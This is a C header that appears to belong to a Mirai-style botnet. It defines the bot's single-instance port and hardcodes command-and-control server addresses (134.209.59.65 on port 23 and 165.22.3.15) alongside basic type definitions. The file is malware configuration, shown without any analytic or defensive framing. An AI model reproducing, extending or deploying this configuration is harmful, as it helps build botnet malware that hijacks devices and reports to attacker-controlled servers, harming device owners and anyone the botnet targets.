#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SINGLE_INSTANCE_PORT 1991

#define FAKE_CNC_ADDR INET_ADDR(134,209,59,65)
#define FAKE_CNC_PORT 23
//165.22.3.15
#define SERVIP1 165
#define SERVIP2 22
#define SERVIP3 3
#define SERVIP4 15

ipv4_t LOCAL_ADDR;


